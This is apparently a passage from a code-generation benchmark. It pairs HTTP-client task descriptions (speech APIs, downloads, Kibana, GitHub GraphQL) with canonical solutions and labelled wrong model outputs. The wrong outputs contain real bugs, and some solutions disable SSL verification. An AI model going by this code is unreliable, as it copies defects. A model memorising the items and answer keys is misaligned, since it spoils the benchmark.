    "wrong_result": "```python\nfrom httpx import AsyncClient, HTTPError, TimeoutError\nfrom typing import Union, Optional, Dict, Any, List, Tuple, TypeVar, Generic, Callable\nimport asyncio\nimport httpx\nimport os\nfrom pathlib import Path\nimport ssl\n\nT = TypeVar('T')\n\nclass AsyncHttpx:\n    proxy: ClassVar[Dict[str, Union[str, None]]] = {\n        'http': None,\n        'https': None\n    }\n\n    def __init__(self):\n        self.client = AsyncClient(timeout=30)\n\n    async def get(self, url: Union[str, List[str]], *, params: Optional[Dict[str, Any]] = None, headers: Optional[Dict[str, str]] = None, cookies: Optional[Dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[Dict[str, str]] = None, timeout: int = 30, **kwargs) -> T:\n        if isinstance(url, list):\n            return await self._get_first_successful(urls=url, params=params, headers=headers, cookies=cookies, verify=verify, use_proxy=use_proxy, proxy=proxy, timeout=timeout, **kwargs)\n        else:\n            return await self._get_single(url=url, params=params, headers=headers, cookies=cookies, verify=verify, use_proxy=use_proxy, proxy=proxy, timeout=timeout, **kwargs)\n\n    async def _get_first_successful(self, urls: List[str], *, params: Optional[Dict[str, Any]] = None, headers: Optional[Dict[str, str]] = None, cookies: Optional[Dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[Dict[str, str]] = None, timeout: int = 30, **kwargs) -> T:\n        for url in urls:\n            try:\n                response = await self._get_single(url=url, params=params, headers=headers, cookies=cookies, verify=verify, use_proxy=use_proxy, proxy=proxy, timeout=timeout, **kwargs)\n                return response\n            except (HTTPError, TimeoutError) as e:\n                print(f\"Request to {url} failed: {e}\")\n        raise Exception(\"All URLs failed\")\n\n    async def _get_single(self, url: str, *, params: Optional[Dict[str, Any]] = None, headers: Optional[Dict[str, str]] = None, cookies: Optional[Dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[Dict[str, str]] = None, timeout: int = 30, **kwargs) -> T:\n        if use_proxy:\n            proxy_url = self.proxy.get('http', None) or self.proxy.get('https', None)\n            if proxy and proxy_url:\n                proxy_url = proxy\n            else:\n                proxy_url = self.proxy.get('http', None) or self.proxy.get('https', None)\n        else:\n            proxy_url = None\n        async with self.client as client:\n            try:\n                response = await client.get(url, params=params, headers=headers, cookies=cookies, verify=verify, proxies=proxy_url, timeout=timeout, **kwargs)\n                return response\n            except (HTTPError, TimeoutError) as e:\n                raise e\n\n    async def post(self, url: str, *, data: Optional[Dict[str, Any]] = None, content: Any = None, files: Any = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[Dict[str, str]] = None, json: Optional[Dict[str, Any]] = None, params: Optional[Dict[str, str]] = None, headers: Optional[Dict[str, str]] = None, cookies: Optional[Dict[str, str]] = None, timeout: int = 30, **kwargs) -> T:\n        if use_proxy:\n            proxy_url = self.proxy.get('http', None) or self.proxy.get('https', None)\n            if proxy and proxy_url:\n                proxy_url = proxy\n            else:\n                proxy_url = self.proxy.get('http', None) or self.proxy.get('https', None)\n        else:\n            proxy_url = None\n        async with self.client as client:\n            try:\n                response = await client.post(url, data=data, content=content, files=files, verify=verify, proxies=proxy_url, timeout=timeout, json=json, params=params, headers=headers, cookies=cookies, **kwargs)\n                return response\n            except (HTTPError, TimeoutError) as e:\n                raise e\n\n    def download_file(self, url: Union[str, List[str]], path: Union[str, Path], *, params: Optional[Dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[Dict[str, str]] = None, headers: Optional[Dict[str, str]] = None, cookies: Optional[Dict[str, str]] = None, timeout: int = 30, **kwargs) -> bool:\n        if isinstance(url, list):\n            for u in url:\n                if not self.download_file(u, path, params=params, verify=verify, use_proxy=use_proxy, proxy=proxy, headers=headers, cookies=cookies, timeout=timeout, **kwargs):\n                    return False\n            return True\n        else:\n            try:\n                response = asyncio.run(self._download_single(url=url, path=path, params=params, verify=verify, use_proxy=use_proxy, proxy=proxy, headers=headers, cookies=cookies, timeout=timeout, **kwargs))\n                if response.status_code == 200:\n                    with open(path, 'wb') as f:\n                        f.write(response.content)\n                    return True\n                else:\n                    return False\n            except Exception as e:\n                print(f\"Download failed: {e}\")\n                return False\n\n    async def _download_single(self, url: str, path: Union[str, Path], *, params: Optional[Dict[str, str]] = None, verify: bool = True, use_proxy: bool = True, proxy: Optional[Dict[str, str]] = None, headers: Optional[Dict[str, str]] = None, cookies: Optional[Dict[str, str]] = None, timeout: int = 30, **kwargs) -> httpx.Response:\n        if use_proxy:\n            proxy_url = self.proxy.get('http', None) or self.proxy.get('https', None)\n            if proxy and proxy_url:\n                proxy_url = proxy\n            else:\n                proxy_url = self.proxy.get('http', None) or self.proxy.get('https', None)\n        else:\n            proxy_url = None\n        async with self.client as client:\n            try:\n                response = await client.get(url, params=params, headers=headers, cookies=cookies, verify=verify, proxies=proxy_url, timeout=timeout, **kwargs)\n                if response.status_code == 200:\n                    with open(path, 'wb') as f:\n                        f.write(response.content)\n                    return response\n                else:\n                    return response\n            except (HTTPError, TimeoutError) as e:\n                raise e\n```"
  },
  {
    "Task_id": 57,
    "Instruction": "Task Description: Implement a function to send audio data to the Hugging Face Whisper ASR (Automatic Speech Recognition) model API and retrieve the transcribed text.\n\nFunction Description: The function `get_audio_transcript` takes audio data in base64-encoded string format, decodes it, sends it to the Hugging Face Whisper API, and returns the transcribed text. It handles errors and exceptions appropriately, providing feedback if the API request fails.\n\nInput:\n- `ctx`: [Context] - The context object for sending responses or errors back to the caller.\n- `sender`: [str] - Identifier for the sender to direct the response to.\n- `audiodata`: [str] - Base64-encoded string representing the audio data to be transcribed.\n\nOutput:\n- The function does not return a value directly but sends the result or error back through the `ctx` object:\n  - On success: Sends an `AudioTranscriptResponse` containing the transcribed text.\n  - On failure: Sends an `Error` containing the error message from the API or exception details.",
    "Canonical_solution": "import os\nimport requests\nimport base64\n\nHUGGING_FACE_ACCESS_TOKEN = os.getenv(\n    \"HUGGING_FACE_ACCESS_TOKEN\", \"HUGGING_FACE_ACCESS_TOKEN\")\n\nWHISPER_URL = \"https://api-inference.huggingface.co/models/openai/whisper-large-v2\"\n\nHEADERS = {\n    \"Authorization\": f\"Bearer {HUGGING_FACE_ACCESS_TOKEN}\"\n}\n\nasync def get_audio_transcript(ctx: Context, sender: str, audiodata: str):\n    try:\n        audiodata = audiodata.encode(\"ascii\")\n        audioBytes = base64.b64decode(audiodata)\n\n        response = requests.post(WHISPER_URL, headers=HEADERS, data=audioBytes)\n\n        if response.status_code != 200:\n            await ctx.send(sender, Error(error=f\"Error: {response.json().get('error')}\"))\n            return\n\n        await ctx.send(sender, AudioTranscriptResponse(transcript=response.json().get('text')))\n        return\n\n    except Exception as ex:\n        await ctx.send(sender, Error(error=f\"Exception detail: {ex}\"))\n        return",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nfrom huggingface_hub import InferenceClient\nimport base64\nimport json\n\ndef get_audio_transcript(ctx, sender, audiodata):\n    try:\n        # Decode the base64 audio data\n        audio_bytes = base64.b64decode(audiodata)\n        \n        # Initialize the Hugging Face Inference API client\n        client = InferenceClient(api_key=\"your_api_key_here\")\n        \n        # Use the Whisper model for transcription\n        result = client.transcribe(audio=audio_bytes, model=\"openai/whisper-base\")\n        \n        # Send the transcribed text back through the context\n        ctx.send(sender, AudioTranscriptResponse(result[\"text\"]))\n    except Exception as e:\n        # Send the error message back through the context\n        ctx.send(sender, Error(str(e)))\n```"
  },
  {
    "Task_id": 58,
    "Instruction": "Task Description: Create a Python class that interacts with the Play.ht API to synthesize text into speech and return the audio as an AudioSegment object.\n\nClass Description: The PlayHtSynthesizer class provides functionality to convert text to speech using the Play.ht API. It handles API authentication, request construction, and response processing to return audio in a usable format.\n\nAttributes:\n- voice: str - The voice identifier to be used for speech synthesis\n- sample_rate: int - The audio sample rate (default: 24000)\n- speed: Optional[float] - The playback speed of the synthesized speech\n- preset: Optional[str] - The voice preset to use\n- api_key: Optional[str] - The API key for Play.ht authentication\n- user_id: Optional[str] - The user ID for Play.ht authentication\n- tts_endpoint: str - The API endpoint for text-to-speech synthesis (default: \"https://play.ht/api/v2/tts/stream\")\n\nMethods:\n- __init__(voice: str, sample_rate: int = 24000, speed: Optional[float] = None, preset: Optional[str] = None, api_key: Optional[str] = None, user_id: Optional[str] = None) -> None - Initializes the synthesizer with configuration parameters\n- synthesize(text: str) -> AudioSegment - Converts the input text to speech using the Play.ht API and returns the audio as an AudioSegment object",
    "Canonical_solution": "import io\nfrom typing import Optional\nimport requests\nfrom pydub import AudioSegment\n\nclass PlayHtSynthesizer:\n    def __init__(\n        self,\n        voice: str,\n        sample_rate: int = 24000,\n        speed: Optional[float] = None,\n        preset: Optional[str] = None,\n        api_key: Optional[str] = None,\n        user_id: Optional[str] = None,\n    ):\n        self.voice = voice\n        self.sample_rate = sample_rate\n        self.speed = speed\n        self.preset = preset\n        self.api_key = api_key\n        self.user_id = user_id\n        self.tts_endpoint = \"https://play.ht/api/v2/tts/stream\"\n\n    def synthesize(self, text: str) -> AudioSegment:\n        headers = {\n            \"Authorization\": f\"Bearer {self.api_key}\",\n            \"X-User-ID\": self.user_id,\n            \"Accept\": \"audio/mpeg\",\n            \"Content-Type\": \"application/json\",\n        }\n        body = {\n            \"voice\": self.voice,\n            \"text\": text,\n            \"sample_rate\": self.sample_rate,\n        }\n        if self.speed is not None:\n            body[\"speed\"] = self.speed\n        if self.preset is not None:\n            body[\"preset\"] = self.preset\n\n        response = requests.post(self.tts_endpoint, headers=headers, json=body, timeout=5)\n        if not response.ok:\n            raise Exception(f\"Play.ht API error: {response.status_code}, {response.text}\")\n\n        return AudioSegment.from_mp3(io.BytesIO(response.content))",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "from pydub import AudioSegment\nimport requests\nimport json\n\nclass PlayHtSynthesizer:\n    def __init__(self, voice: str, sample_rate: int = 24000, speed: Optional[float] = None, preset: Optional[str] = None, api_key: Optional[str] = None, user_id: Optional[str] = None):\n        self.voice = voice\n        self.sample_rate = sample_rate\n        self.speed = speed\n        self.preset = preset\n        self.api_key = api_key\n        self.user_id = user_id\n        self.tts_endpoint = \"https://play.ht/api/v2/tts/stream\"\n\n    def synthesize(self, text: str) -> AudioSegment:\n        headers = {\n            \"Authorization\": f\"Bearer {self.api_key}\",\n            \"Content-Type\": \"application/json\",\n            \"User-Id\": self.user_id\n        }\n        data = {\n            \"text\": text,\n            \"voice\": self.voice,\n            \"sample_rate\": self.sample_rate,\n            \"speed\": self.speed,\n            \"preset\": self.preset\n        }\n        response = requests.post(self.tts_endpoint, headers=headers, data=json.dumps(data), stream=True)\n        audio = AudioSegment.empty()\n        for chunk in response.iter_content(chunk_size=1024):\n            if chunk:\n                audio += AudioSegment.from_mp3(chunk)\n        return audio"
  },
  {
    "Task_id": 60,
    "Instruction": "Task Description: Create a Python module for handling HTTP client operations including login, check-in, and logout functionalities with support for retries and optional proxy usage.\n\nFunction Description: The module provides three main functions for HTTP interactions:\n1. `login`: Performs a POST request to authenticate with a service\n2. `checkin`: Performs a POST request to check in/register with a service\n3. `logout`: Performs a GET request to terminate a session\n\nInput:\n- For `login`:\n  - url: str - The endpoint URL for login\n  - params: dict - The login credentials/data to send\n  - headers: dict - HTTP headers for the request\n  - retry: int - Number of retry attempts\n  - proxy: bool - Whether to use proxy (default False)\n\n- For `checkin`:\n  - url: str - The endpoint URL for check-in\n  - headers: dict - HTTP headers for the request\n  - retry: int - Number of retry attempts\n  - proxy: bool - Whether to use proxy (default False)\n\n- For `logout`:\n  - url: str - The endpoint URL for logout\n  - headers: dict - HTTP headers for the request\n\nOutput:\n- For `login`: dict - Returns response headers (lowercased keys) if successful, empty dict otherwise\n- For `checkin`: None - Logs success/failure messages\n- For `logout`: int - Returns 0 on success, -3 on failure",
    "Canonical_solution": "import logging\nimport requests\nimport simplejson as json\nfrom requests.exceptions import RequestException\nfrom simplejson.decoder import JSONDecodeError\n\nHEADER = {\n    \"user-agent\": \"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3803.0 Mobile Safari/537.36\",\n    \"accept\": \"application/json, text/javascript, */*; q=0.01\",\n    \"accept-language\": \"zh-CN,zh;q=0.9\",\n    \"dnt\": \"1\",\n    \"Connection\": \"keep-alive\",\n    \"content-type\": \"application/x-www-form-urlencoded; charset=UTF-8\",\n    \"x-requested-with\": \"XMLHttpRequest\",\n}\n\nPROXY = {\"http\": \"http://127.0.0.1:1080\", \"https\": \"http://127.0.0.1:1080\"}\n\ndef login(url, params, headers, retry, proxy=False) -> dict:\n    try:\n        if proxy:\n            response = requests.post(\n                url,\n                data=params,\n                headers=headers,\n                allow_redirects=True,\n                proxies=PROXY,\n                verify=False,\n            )\n        else:\n            response = requests.post(url, data=params, headers=headers, allow_redirects=True)\n\n        if response.status_code == 200:\n            return {str(key).lower(): value for key, value in response.headers.items()}\n        return {}\n\n    except RequestException as e:\n        logging.error(str(e))\n        retry -= 1\n\n        if retry > 0:\n            time.sleep(get_randint(30 * 60, 90 * 60))\n            return login(url, params, headers, retry, proxy)\n\n        logging.error(\"\u767b\u5f55\u5931\u8d25 URL: {}\".format(extract_domain(url)))\n        return {}\n\ndef checkin(url, headers, retry, proxy=False) -> None:\n    try:\n        response = (\n            requests.post(url, headers=headers, proxies=PROXY, verify=False)\n            if proxy\n            else requests.post(url, headers=headers)\n        )\n\n        if response.status_code == 200:\n            key = \"Content-Encoding\"\n            try:\n                data = (\n                    json.loads(brotli.decompress(response.content).decode(\"utf-8\"))\n                    if key in response.headers and response.headers[\"Content-Encoding\"] == \"br\"\n                    else response.json()\n                )\n\n                logging.info(\"\u7b7e\u5230\u6210\u529f URL: {} {}\".format(extract_domain(url), data[\"msg\"]))\n            except JSONDecodeError:\n                logging.error(\"\u7b7e\u5230\u5931\u8d25 URL: {}\".format(extract_domain(url)))\n\n    except RequestException as e:\n        logging.error(str(e))\n        retry -= 1\n\n        if retry > 0:\n            time.sleep(get_randint(30, 60 * 60))\n            return checkin(url, headers, retry, proxy)\n\n        logging.error(\"\u7b7e\u5230\u5931\u8d25 URL: {}\".format(extract_domain(url)))\n\ndef logout(url, headers) -> int:\n    try:\n        response = requests.get(url, headers=headers)\n        if response.status_code == 200:\n            return 0\n        else:\n            logging.info(\"\u9000\u51fa\u5931\u8d25 URL: {}\".format(extract_domain(url)))\n            return -3\n    except RequestException:\n        return -3",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nfrom requests.adapters import HTTPAdapter\nfrom urllib3.util.retry import Retry\n\ndef login(url, params, headers, retry=3, proxy=False):\n    session = requests.Session()\n    retries = Retry(total=retry, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])\n    session.mount('http://', HTTPAdapter(max_retries=retries))\n    session.mount('https://', HTTPAdapter(max_retries=retries))\n    \n    if proxy:\n        proxies = {\n            'http': 'http://127.0.0.1:8080',\n            'https': 'https://127.0.0.1:8080'\n        }\n    else:\n        proxies = None\n    \n    try:\n        response = session.post(url, params=params, headers=headers, proxies=proxies)\n        response.raise_for_status()\n        return {k.lower(): v for k, v in response.headers.items()}\n    except requests.exceptions.RequestException as e:\n        return {}\n\ndef checkin(url, headers, retry=3, proxy=False):\n    session = requests.Session()\n    retries = Retry(total=retry, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])\n    session.mount('http://', HTTPAdapter(max_retries=retries))\n    session.mount('https://', HTTPAdapter(max_retries=retries))\n    \n    if proxy:\n        proxies = {\n            'http': 'http://127.0.0.1:8080',\n            'https': 'https://127.0.0.1:8080'\n        }\n    else:\n        proxies = None\n    \n    try:\n        session.post(url, headers=headers, proxies=proxies)\n        print(\"Check-in successful\")\n    except requests.exceptions.RequestException as e:\n        print(\"Check-in failed:\", str(e))\n\ndef logout(url, headers):\n    session = requests.Session()\n    retries = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])\n    session.mount('http://', HTTPAdapter(max_retries=retries))\n    session.mount('https://', HTTPAdapter(max_retries=retries))\n    \n    try:\n        response = session.get(url, headers=headers)\n        response.raise_for_status()\n        return 0\n    except requests.exceptions.RequestException as e:\n        return -3"
  },
  {
    "Task_id": 63,
    "Instruction": "Task Description: Create a function to download a file from a given URL and save it to a specified local folder.\n\nFunction Description: The function downloads a file from the provided URL using HTTP GET request and saves it to the specified folder. It handles folder creation if it doesn't exist and provides feedback on the download status.\n\nInput:\n- url: str - The URL of the file to download\n- folder_path: str - The local directory path where the file should be saved\n\nOutput:\n- None - The function doesn't return any value but saves the file to disk and prints status messages",
    "Canonical_solution": "import os\nimport requests\n\ndef download_file(url: str, folder_path: str) -> None:\n    # Create the folder if it doesn't exist\n    if not os.path.exists(folder_path):\n        os.makedirs(folder_path)\n\n    # Extract filename from URL\n    filename = url.split(\"/\")[-1]\n\n    # Define path to save the file\n    file_path = os.path.join(folder_path, filename)\n\n    # Send a GET request to the URL\n    response = requests.get(url)\n\n    # Check if request was successful (status code 200)\n    if response.status_code == 200:\n        # Save the file to the specified folder\n        with open(file_path, \"wb\") as f:\n            f.write(response.content)\n        print(f\"File downloaded successfully to {file_path}\")\n    else:\n        print(f\"Failed to download file. Status code: {response.status_code}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import os\nimport requests\n\ndef download_file(url, folder_path):\n    # Create the folder if it doesn't exist\n    os.makedirs(folder_path, exist_ok=True)\n    \n    # Extract the filename from the URL\n    filename = url.split('/')[-1]\n    file_path = os.path.join(folder_path, filename)\n    \n    try:\n        # Send HTTP GET request\n        response = requests.get(url, stream=True)\n        response.raise_for_status()  # Check for HTTP errors\n        \n        # Write the downloaded content to a local file\n        with open(file_path, 'wb') as file:\n            for chunk in response.iter_content(chunk_size=8192):\n                file.write(chunk)\n        \n        print(f\"File downloaded successfully and saved to: {file_path}\")\n    \n    except requests.exceptions.RequestException as e:\n        print(f\"Error downloading file: {e}\")"
  },
  {
    "Task_id": 64,
    "Instruction": "Task Description: Create a Python class that serves as an HTTP client for interacting with Kibana and Elasticsearch APIs, handling authentication, requests, and responses for various operations.\n\nClass Description: The KibanaHTTPClient class provides methods to interact with Kibana's saved objects and Elasticsearch's templates through HTTP requests. It handles authentication, SSL verification, and response parsing.\n\nAttributes:\n- username: str - The username for authentication (default: \"redelk\")\n- password: str - The password for authentication (default: None)\n- verify_ssl: bool - Flag to enable/disable SSL verification (default: False)\n- scheme: str - The URL scheme (default: \"https\")\n- kibana_url: str - The base URL for Kibana API (default: \"https://localhost:5601\")\n- es_url: str - The base URL for Elasticsearch API (default: \"https://localhost:9200\")\n- headers: dict - HTTP headers including \"kbn-xsrf\" for Kibana requests\n\nMethods:\n- fetch_kibana_object(obj_type: str) -> list - Fetches Kibana saved objects of specified type by making a POST request to Kibana's export API. Returns parsed NDJSON response.\n- fetch_es_template(template_name: str) -> dict - Retrieves an Elasticsearch template by name via GET request. Returns parsed JSON response.\n- fetch_es_component_templates() -> dict - Gets all Elasticsearch component templates via GET request. Returns parsed JSON response.\n- fetch_es_index_templates() -> dict - Retrieves all Elasticsearch index templates via GET request. Returns parsed JSON response.",
    "Canonical_solution": "import requests\nimport json\nimport ndjson\nimport os\nimport re\n\nclass KibanaHTTPClient:\n    def __init__(self, username=\"redelk\", password=None, verify_ssl=False):\n        self.username = username\n        self.password = password\n        self.verify_ssl = verify_ssl\n        self.scheme = \"https\"\n        self.kibana_url = f\"{self.scheme}://localhost:5601\"\n        self.es_url = f\"{self.scheme}://localhost:9200\"\n        self.headers = {\"kbn-xsrf\": \"true\"}\n\n    def fetch_kibana_object(self, obj_type):\n        try:\n            response = requests.post(\n                f\"{self.kibana_url}/api/saved_objects/_export\",\n                json={\"type\": obj_type},\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n                headers=self.headers,\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return ndjson.loads(response.text.encode(\"utf-8\"))\n        except Exception as error:\n            raise Exception(f\"Error fetching kibana object {obj_type}: {error}\")\n\n    def fetch_es_template(self, template_name):\n        try:\n            response = requests.get(\n                f\"{self.es_url}/_template/{template_name}\",\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return json.loads(response.text.encode(\"utf-8\"))\n        except Exception as error:\n            raise Exception(f\"Error fetching ES template {template_name}: {error}\")\n\n    def fetch_es_component_templates(self):\n        try:\n            response = requests.get(\n                f\"{self.es_url}/_component_template\",\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return response.json()\n        except Exception as error:\n            raise Exception(f\"Error fetching ES component templates: {error}\")\n\n    def fetch_es_index_templates(self):\n        try:\n            response = requests.get(\n                f\"{self.es_url}/_index_template\",\n                verify=self.verify_ssl,\n                auth=(self.username, self.password),\n            )\n            if response.status_code != 200:\n                raise Exception(f\"HTTP status code {response.status_code}\")\n            return response.json()\n        except Exception as error:\n            raise Exception(f\"Error fetching ES index templates: {error}\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "class KibanaHTTPClient:\n    def __init__(self, username=\"redelk\", password=None, verify_ssl=False, scheme=\"https\", kibana_url=\"https://localhost:5601\", es_url=\"https://localhost:9200\"):\n        self.username = username\n        self.password = password\n        self.verify_ssl = verify_ssl\n        self.scheme = scheme\n        self.kibana_url = kibana_url\n        self.es_url = es_url\n        self.headers = {\n            \"Content-Type\": \"application/json\",\n            \"kbn-xsrf\": \"true\"\n        }\n\n    def fetch_kibana_object(self, obj_type):\n        import requests\n        url = f\"{self.kibana_url}/api/saved_objects/_find\"\n        data = {\"type\": obj_type}\n        response = requests.post(url, json=data, headers=self.headers, auth=(self.username, self.password), verify=self.verify_ssl)\n        response.raise_for_status()\n        return response.json()\n\n    def fetch_es_template(self, template_name):\n        import requests\n        url = f\"{self.es_url}/_template/{template_name}\"\n        response = requests.get(url, headers=self.headers, auth=(self.username, self.password), verify=self.verify_ssl)\n        response.raise_for_status()\n        return response.json()\n\n    def fetch_es_component_templates(self):\n        import requests\n        url = f\"{self.es_url}/_component_template\"\n        response = requests.get(url, headers=self.headers, auth=(self.username, self.password), verify=self.verify_ssl)\n        response.raise_for_status()\n        return response.json()\n\n    def fetch_es_index_templates(self):\n        import requests\n        url = f\"{self.es_url}/_index_template\"\n        response = requests.get(url, headers=self.headers, auth=(self.username, self.password), verify=self.verify_ssl)\n        response.raise_for_status()\n        return response.json()"
  },
  {
    "Task_id": 66,
    "Instruction": "Task Description: Retrieve information about a specific GitHub project using the GitHub GraphQL API.\n\nFunction Description: This function queries the GitHub GraphQL API to fetch project details (id, title, and number) for a given organization and project title. It authenticates using a GitHub token and returns the project information if found.\n\nInput:\n- github_token: [str] - GitHub personal access token for authentication\n- github_org: [str] - GitHub organization name\n- github_project: [str] - Title of the project to search for\n\nOutput:\n- [dict/None] - Returns a dictionary containing the project's id, title, and number if found, otherwise None. Raises an HTTPError if the request fails.",
    "Canonical_solution": "import requests\nimport os\nimport sys\nfrom datetime import datetime, timedelta\n\n\nGITHUB_GRAPHQL_URL = \"https://api.github.com/graphql\"\n\n\ndef get_github_project_info(github_token, github_org, github_project):\n    headers = {\n        \"Authorization\": f\"Bearer {github_token}\",\n        \"Content-Type\": \"application/json\"\n    }\n    query = '''\n    {\n      organization(login: \"%s\") {\n        projectsV2(first: 20) {\n          nodes {\n            id\n            title\n            number\n          }\n        }\n      }\n    }\n    ''' % (github_org)\n    payload = {\n        \"query\": query\n    }\n\n    response = requests.post(GITHUB_GRAPHQL_URL, headers=headers, json=payload)\n    if response.status_code == 200:\n        # fine project by title\n        nodes = response.json().get(\"data\").get(\"organization\").get(\"projectsV2\").get(\"nodes\")\n        for node in nodes:\n            if node.get(\"title\") == github_project:\n                return node\n    else:\n        response.raise_for_status()",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\n\ndef get_github_project(github_token, github_org, github_project):\n    url = \"https://api.github.com/graphql\"\n    headers = {\n        \"Authorization\": f\"token {github_token}\",\n        \"Accept\": \"application/json\"\n    }\n    query = f\"\"\"\n        query {{\n            organization(login: \"{github_org}\") {{\n                projects(first: 10) {{\n                    nodes {{\n                        id\n                        title\n                        number\n                    }}\n                }}\n            }}\n        }}\n    \"\"\"\n    params = {\n        \"query\": query\n    }\n    try:\n        response = requests.post(url, headers=headers, json=params)\n        response.raise_for_status()\n        data = response.json()\n        projects = data.get(\"data\", {}).get(\"organization\", {}).get(\"projects\", {}).get(\"nodes\", [])\n        for project in projects:\n            if project.get(\"title\") == github_project:\n                return {{\n                    \"id\": project[\"id\"],\n                    \"title\": project[\"title\"],\n                    \"number\": project[\"number\"]\n                }}\n        return None\n    except requests.exceptions.HTTPError as e:\n        raise e"
  },
  {
    "Task_id": 67,
    "Instruction": "Task Description: Create a function to download financial market data from a specific API endpoint, handling authentication, progress tracking, and error checking during the download process.\n\nFunction Description: The function downloads compressed CSV data from a REST API endpoint for a given exchange, data type, symbol, and date. It streams the download to efficiently handle large files, shows progress using a progress bar, verifies the download completeness, and saves the data to a specified file path. The function includes proper error handling for failed requests or incomplete downloads.\n\nInput:\n- exchange: [str] - The financial exchange identifier (e.g., 'binance')\n- data_type: [str] - The type of market data to download (e.g., 'trades')\n- symbol: [str] - The trading symbol/pair (e.g., 'BTCUSDT')\n- yyyymmdd: [int/str] - The date in YYYYMMDD format\n- filepath: [str] - The local path where the downloaded file should be saved\n- key: [str] - The API authorization key (Bearer token)\n\nOutput:\n- None - The function doesn't return anything but saves the downloaded data to the specified file path\n- Raises RuntimeError if the download fails (either due to HTTP error or incomplete download)",
    "Canonical_solution": "import json\nimport os.path\nimport requests\nfrom datetime import datetime, timedelta\nfrom tqdm import tqdm\n\ndef download(exchange, data_type, symbol, yyyymmdd, filepath, key):\n    yyyymmdd = str(yyyymmdd)\n    url = f'https://datasets.tardis.dev/v1/{exchange}/{data_type}/{yyyymmdd[:4]}/{yyyymmdd[4:6]}/{yyyymmdd[6:]}/{symbol}.csv.gz'\n\n    response = requests.get(url, stream=True, headers={'Authorization': f'Bearer {key}'})\n    if response.status_code != 200:\n        raise RuntimeError('Could not download file')\n\n    total_size = int(response.headers.get('content-length', 0))\n    block_size = 1024\n\n    with tqdm(total=total_size, unit='B', unit_scale=True) as progress_bar:\n        with open(filepath, 'wb') as file:\n            for data in response.iter_content(block_size):\n                progress_bar.update(len(data))\n                file.write(data)\n\n    if total_size != 0 and progress_bar.n != total_size:\n        raise RuntimeError('Could not download file')",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nfrom tqdm import tqdm\nimport os\n\ndef download_market_data(exchange, data_type, symbol, yyyymmdd, filepath, key):\n    url = f\"https://{exchange}.com/api/v1/data/{data_type}/{symbol}/{yyyymmdd}\"\n    headers = {\n        \"Authorization\": f\"Bearer {key}\",\n        \"Accept\": \"application/zip\"\n    }\n    \n    try:\n        response = requests.get(url, headers=headers, stream=True)\n        response.raise_for_status()\n        \n        total_size = int(response.headers.get('content-length', 0))\n        downloaded = 0\n        \n        with open(filepath, 'wb') as f:\n            for chunk in tqdm(response.iter_content(chunk_size=8192), total=total_size // 8192, unit='B', unit_scale=True, unit_divisor=1024):\n                if chunk:\n                    f.write(chunk)\n                    downloaded += len(chunk)\n                    \n        if downloaded != total_size:\n            raise RuntimeError(\"Download incomplete\")\n            \n    except requests.exceptions.RequestException as e:\n        raise RuntimeError(f\"Failed to download data: {str(e)}\") from e\n    except Exception as e:\n        raise RuntimeError(f\"An error occurred: {str(e)}\") from e"
  },
  {
    "Task_id": 68,
    "Instruction": "Task Description: Download a comic image from the xkcd website given a specific issue number.\n\nFunction Description: The function downloads an image from the xkcd comic website by first fetching the webpage of the specified issue number, parsing the HTML to extract the image URL, and then downloading the image to the local filesystem. It handles HTTP requests and responses, checks for success status codes, and saves the image using streaming to avoid memory issues with large files.\n\nInput: \n- issue_number: [str] - The issue number of the comic to download (e.g., \"1234\"). This is appended to the base xkcd URL to form the full webpage URL.\n\nOutput: \n- [str] - A success message indicating the downloaded image filename if successful, or an error message if the request fails or the issue number is invalid.",
    "Canonical_solution": "import requests\nfrom bs4 import BeautifulSoup as bs\nimport shutil\n\ndef download_comic_image(issue_number):\n    url = \"https://xkcd.com/\"+ issue_number\n    response = requests.get(url)\n\n    if response.status_code == 200:\n        soup = bs(response.content, 'html.parser')\n        image_link = soup.find_all('img')[2]['src']\n        image_name = image_link.split('/')[-1]\n        image_url = \"https:\" + image_link\n        r = requests.get(image_url, stream=True)\n        \n        if r.status_code == 200:\n            r.raw.decode_content = True\n            with open(image_name, 'wb') as f:\n                shutil.copyfileobj(r.raw, f)\n            return f'Image successfully Downloaded: {image_name}'\n        else:\n            return 'Image Couldn\\'t be retrieved'\n    else:\n        return \"Issue number is invalid\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
